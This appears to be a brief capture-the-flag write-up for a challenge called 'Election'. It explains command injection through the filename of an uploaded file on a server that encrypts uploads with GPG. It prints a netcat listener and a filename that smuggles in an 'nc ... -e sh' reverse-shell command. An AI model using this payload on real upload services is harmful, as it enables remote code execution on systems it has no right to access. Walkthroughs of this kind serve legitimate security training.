# Election

If you upload a normal file, you will be redirected to a copy of your file encrypted with some GPG key. GPG is a common command-line utility for encryption/decryption. This leads us to believe there is a potential way to inject commands into the mix in order to cause remote command execution.

The only input we supply to the server is the file we're uploading, therefore we should look at that to see if altering the filename will help us. The file we were redirected to earlier had a different name than ours but it still had the .pdf extension. If we add a command to call back to us in the extension of our file, we can receive a shell on the server.

1. Term 1: `nc -lvp 1337`
2. Term 2: `touch 'test.$(nc 172.17.0.1 1337 -e sh);pdf'`

Upload the file created in Term 2 for a shell callback in Term 1.
